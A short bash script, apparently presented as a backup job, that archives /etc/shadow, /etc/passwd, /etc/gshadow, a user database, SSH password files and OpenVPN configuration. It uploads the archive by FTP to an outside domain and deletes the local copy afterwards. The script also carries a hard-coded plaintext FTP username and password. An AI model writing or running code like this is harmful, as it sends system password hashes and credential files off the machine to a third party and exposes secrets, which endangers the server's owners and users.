#!/bin/bash

HOST="chaychana.com/$1/"
USER="backup@chaychana.com"
PASSWD="rgS9yHUCH"
FILE=`hostname`_`date +%Y-%m-%d`.vps

fun_ftp() {
curl --upload-file "/root/script/$FILE" --user "$USER:$PASSWD" "ftp://$HOST"
sleep 2
rm -rf /root/script/$FILE >/dev/null 2>&1
}

if [ -f "/root/usuarios.db" ]; then
	[[ -e "/etc/openvpn" ]] && {

		tar cvf /root/script/$FILE /root/usuarios.db /etc/shadow /etc/passwd /etc/group /etc/gshadow /etc/SSHExtra/senha /etc/SSHExtra/v2ray /etc/openvpn >/dev/null 2>&1
		sleep 2
		fun_ftp
		} || {

		tar cvf /root/script/$FILE /root/usuarios.db /etc/shadow /etc/passwd /etc/group /etc/gshadow /etc/SSHExtra/senha /etc/SSHExtra/v2ray >/dev/null 2>&1
		sleep 2
		fun_ftp
	}
fi
